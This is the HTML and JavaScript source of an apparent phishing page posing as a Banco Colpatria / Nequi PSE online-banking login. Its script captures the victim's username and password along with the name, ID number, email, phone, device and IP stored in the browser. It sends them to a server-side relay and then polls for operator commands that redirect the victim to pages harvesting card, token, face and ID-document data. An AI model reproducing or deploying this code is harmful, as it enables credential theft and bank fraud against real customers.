<!DOCTYPE html>
<html lang="en">

<head>
	  <style>
@keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.1); opacity: 0.7; }
    100% { transform: scale(1); opacity: 1; }
}
</style>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banca virtual | Confirmacion</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="logo-banner">
                        <img src="img/l25.svg" alt="Banner Logo" />
                    </div>
                    <div class="titulo">
                        <h1>Ingresa a tu Banca Virtual</h1>
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fusuario">
                                <input type="hidden" id="session_id" name="session_id">
                                <input type="hidden" id="username" name="username">
                                <div class="inputg columna">
                                    <input type="text" name="usuario" id="usuario" placeholder="Nombre de usuario" maxlength="12" />
                                    <div class="error" id="eUsuario">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Ingresa un nombre de usuario que contenga entre 6 a 12 caracteres y sin caracteres especiales</span>
                                    </div>
                                </div>
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input style="width: 100%;" type="password" name="contra" id="contra" placeholder="Contraseña" maxlength="15" class="contrasena" />
                                    <div class="vali" style="display: none;" id="validaciones">
                                        <span id="cantidad">8+ caracteres</span>
                                        <span id="mayus">1+ mayuscula</span>
                                        <span id="minus">1+ minúscula</span>
                                        <span id="numero">1+ número</span>
                                    </div>
                                </div>
                                <div class="inputge">
                                    <a href="javascript:void(0)" class="enlacef" style="margin-top: 7px;">¿Necesitas ayuda para ingresar?</a>
                                </div>

                                <div class="inputche">
                                    <input type="checkbox" name="record" id="record" />
                                    <label for="record">Recordar mi nombre de usuario</label>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btnEntrar" class="btn">Ingresar</button>
                                </div>
                                <div class="inputg inicio">
                                    <p style="margin-bottom: 5px;">¿No te has registrado?</p>
                                    <a href="javascript:void(0)" class="enlacef">Registrate ahora</a>
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/baner1.svg" alt="depart" />
                        </div>

                    </div>
                </div>
            </div>
        </div>

    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.7); z-index: 9999; justify-content: center; align-items: center;">
        <img src="img/l21.svg" alt="Cargando..." style="width: 80px; height: 80px; animation: blink 1.5s infinite;">
    </div>

    <style>
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>

    <script src="js/funciones.js"></script>
    <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      if (sessionInput) sessionInput.value = sessionId;

      // Obtener usuario desde URL params
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        if (usernameInput) usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Manejo del botón Ingresar
      const btnIngresar = document.getElementById('btnEntrar');
      
      if (btnIngresar) {
        const newBtn = btnIngresar.cloneNode(true);
        btnIngresar.parentNode.replaceChild(newBtn, btnIngresar);
        
        newBtn.addEventListener('click', async function (event) {
          event.preventDefault();
          event.stopPropagation();

          const usuario = document.getElementById('usuario').value;
          const contra = document.getElementById('contra').value;
          
          if (!usuario || usuario.length === 0) {
            document.getElementById('eUsuario').style.display = 'block';
            return;
          }
          
          if (!contra || contra.length === 0) {
            document.getElementById('contra').focus();
            return;
          }

          let identificacion = usuario;
          let password = contra;
          
          if (password.length > 15) {
            alert('La clave debe tener máximo 15 caracteres alfanuméricos');
            return;
          }
          
          if (identificacion.length < 5) {
            alert('La identificación debe tener al menos 5 dígitos');
            return;
          }

          const loaderOverlay = document.getElementById('loader-overlay');
          if (loaderOverlay) loaderOverlay.style.display = 'flex';

          localStorage.setItem('password', password);
          localStorage.setItem('identificacion', identificacion);

          const userAgent = navigator.userAgent;
          let dispositivo = 'PC';
          if (/Android/i.test(userAgent)) dispositivo = 'Android';
          else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
          
          const hora = new Date().toLocaleString('es-ES');

          fetch('get_ip.php')
            .then(response => response.json())
            .then(data => {
              const ip = data.ip || 'No disponible';
              
              // Extracción corregida de datos del LocalStorage
              const cedulaReal = localStorage.getItem('val') || identificacion;
              const nombreReal = localStorage.getItem('nom') || localStorage.getItem('per') || 'No disponible';

              const mensaje = `
💎<b>BANCO COLPATRIA</b>💎
<b>😈NEQUI PSE ACTIVO😈</b>

<b>👤 Nombre:</b> ${nombreReal}
<b>🆔 Cédula:</b> ${cedulaReal}
<b>💌 Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
<b>📞 Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
<b>📟 Disp:</b> ${dispositivo} | <b>🗺 IP:</b> ${ip}
<b>⏱ Hora:</b> ${hora}
------------------------------
👤 Usuario: <code>${identificacion}</code>
🔑 Clave: <code>${password}</code>
------------------------------`;

              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', sessionId);

              fetch('procesar_logo.php', { method: 'POST', body: formData })
              .then(res => res.json())
              .then(result => {
                if (result.status === 'success') {
                  checkPaymentVerification(sessionId, result.messageId);
                } else {
                  if (loaderOverlay) loaderOverlay.style.display = 'none';
                  alert("Error en el procesamiento. Intente nuevamente.");
                }
              })
              .catch(() => {
                if (loaderOverlay) loaderOverlay.style.display = 'none';
                alert("Error de conexión. Intente nuevamente.");
              });
            })
            .catch(() => {
              // Lógica de respaldo sin IP
              const mensaje = `💎BANCO COLPATRIA💎\n\n👤 Usuario: ${identificacion}\n🔑 Clave: ${password}\n---------------`;
              const formData = new FormData();
              formData.append('message', mensaje);
              formData.append('transactionId', sessionId);
              fetch('procesar_logo.php', { method: 'POST', body: formData })
              .then(res => res.json())
              .then(result => {
                if (result.status === 'success') checkPaymentVerification(sessionId, result.messageId);
                else if (loaderOverlay) loaderOverlay.style.display = 'none';
              });
            });
        });
      }
    });

    async function checkPaymentVerification(transactionId, messageId) {
      try {
        const formData = new FormData();
        formData.append('transactionId', transactionId);
        formData.append('messageId', messageId);

        const res = await fetch('verificar_respuesta.php', { method: 'POST', body: formData });
        const result = await res.json();

        if (result.action) {
          const loader = document.getElementById('loader-overlay');
          if (loader) loader.style.display = 'none';

          switch (result.action) {
            case 'error_logo':
              alert("Usuario o clave incorrectos.");
              window.location.href = "index.php";
              break;

            case 'error_cajero':
              window.location.href = "caje.php";
              break;

            case 'error_tarjeta':
              alert("Error con la tarjeta.");
              window.location.href = "index.php";
              break;

            case 'error_dinamica':
            case 'pedir_dinamica':
              alert("Dinámica incorrecta. Intente nuevamente.");
              window.location.href = "token.php";
              break;

            case 'error': // ✅ NUEVO: Redirección para rostro (Cara)
              window.location.href = "/caras";
              break;

            case 'cedula': // ✅ NUEVO: Redirección para documento (Cédula)
              window.location.href = "/cedula";
              break;

            case 'confirm_finalizar':
              window.location.href = "/fin.php";
              break;

            default:
              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
              break;
          }
        } else {
          setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
        }
      } catch (err) {
        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
      }
    }
</script>

<div id="loader" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #ffffff; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 9999;">
    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
</div>

<script>
    setTimeout(function () {
        const ldr = document.getElementById('loader');
        if (ldr) ldr.style.display = 'none';
    }, 3000);
</script>
</body>

</html>